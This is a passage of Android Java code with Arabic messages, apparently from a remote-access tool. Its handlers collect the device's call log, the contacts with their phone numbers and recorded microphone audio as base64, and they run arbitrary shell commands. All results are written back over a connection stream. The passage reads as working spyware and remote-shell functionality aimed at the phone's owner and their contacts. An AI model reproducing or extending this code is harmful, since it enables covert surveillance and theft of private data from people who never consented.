    }

    private String audioBase64(File file) throws IOException {
        byte[] data = readFileBytes(file);
        if (data.length == 0) {
            throw new IOException("الملف الناتج فارغ (قد لا يوجد ميكروفون على هذا الجهاز)");
        }
        return android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
    }

    private static byte[] readFileBytes(File file) throws IOException {
        long length = file.length();
        if (length == 0) {
            return new byte[0];
        }
        int size = (int) Math.min(length, Integer.MAX_VALUE);
        byte[] data = new byte[size];
        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        try {
            int offset = 0;
            while (offset < size) {
                int read = fis.read(data, offset, size - offset);
                if (read == -1) {
                    break;
                }
                offset += read;
            }
            if (offset != size) {
                byte[] trimmed = new byte[offset];
                System.arraycopy(data, 0, trimmed, 0, offset);
                data = trimmed;
            }
        } finally {
            fis.close();
        }
        return data;
    }

    private void handleCallLog(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            writeMessage(out, "صلاحية سجل المكالمات غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder callLog = new StringBuilder();
            String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DATE, CallLog.Calls.DURATION};
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, projection,
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) {
                writeMessage(out, "لا يوجد سجل مكالمات");
                return;
            }
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                @SuppressWarnings("deprecation")
                String typeLabel = "1".equals(type) ? "وارد"
                        : "2".equals(type) ? "صادر" : "مفقود";
                callLog.append("رقم: ").append(number)
                        .append(", النوع: ").append(typeLabel)
                        .append(", التاريخ: ").append(new Date(Long.parseLong(date)))
                        .append(", المدة: ").append(duration).append(" ثانية\n");
            }
            if (callLog.length() == 0) {
                writeMessage(out, "سجل المكالمات فارغ");
            } else {
                writeMessage(out, callLog.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب سجل المكالمات: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void handleContacts(OutputStream out) throws IOException {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            writeMessage(out, "صلاحية جهات الاتصال غير ممنوحة");
            return;
        }
        Cursor cursor = null;
        try {
            StringBuilder contacts = new StringBuilder();
            String[] projection = {ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME};
            cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                    projection, null, null, null);
            if (cursor == null) {
                writeMessage(out, "لا توجد جهات اتصال");
                return;
            }
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                contacts.append("الاسم: ").append(name);

                Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                if (phoneCursor != null) {
                    try {
                        if (phoneCursor.moveToFirst()) {
                            contacts.append(", الأرقام: ");
                            do {
                                String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                                contacts.append(phoneNumber).append(" ");
                            } while (phoneCursor.moveToNext());
                        }
                    } finally {
                        phoneCursor.close();
                    }
                }
                contacts.append("\n");
            }
            if (contacts.length() == 0) {
                writeMessage(out, "لا توجد جهات اتصال");
            } else {
                writeMessage(out, contacts.toString());
            }
        } catch (Exception e) {
            writeMessage(out, "فشل في جلب جهات الاتصال: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    // ---------- أدوات عامة ----------

    private boolean hasPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * تنفيذ أمر نظامي وتجميع مخرجاته (stdout + stderr) مع مهلة زمنية لمنع
     * تعليق حلقة الاتصال عندما يحجب الأمر (مثل ping أو النصوص الطويلة).
     */
    private String runShellCommand(String... argv) {
        Process process = null;
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder(argv).redirectErrorStream(true);
            process = pb.start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            long deadline = System.currentTimeMillis() + SHELL_TIMEOUT_MS;
            boolean alive = true;
            while (alive) {
                boolean exited = false;
                try {
                    process.exitValue(); // يرمي الاستثناء إذا كان لا يزال يعمل
                    exited = true;
                } catch (IllegalThreadStateException stillRunning) {
                    if (System.currentTimeMillis() > deadline) {
                        process.destroy();
                        output.append("[انتهت المهلة الزمنية للأمر]\n");
                        exited = true;
                    }
                }
                if (exited) {
                    alive = false;
                }
                drain(reader, output);
                if (alive) {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            drain(reader, output);
            int exit = -1;
            try {
                exit = process.exitValue();
            } catch (IllegalThreadStateException ignored) {
            }
            if (exit != 0 && exit != -1) {
                output.append("[رمز الخروج: ").append(exit).append("]");
            }
        } catch (IOException e) {
            return "خطأ في تنفيذ الأمر: " + e.getMessage();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        String result = output.toString().trim();
        return result.isEmpty() ? "(لا يوجد مخرجات)" : result;
    }

    private static void drain(BufferedReader reader, StringBuilder out) throws IOException {
        while (reader.ready()) {
            out.append((char) reader.read());
        }
    }
}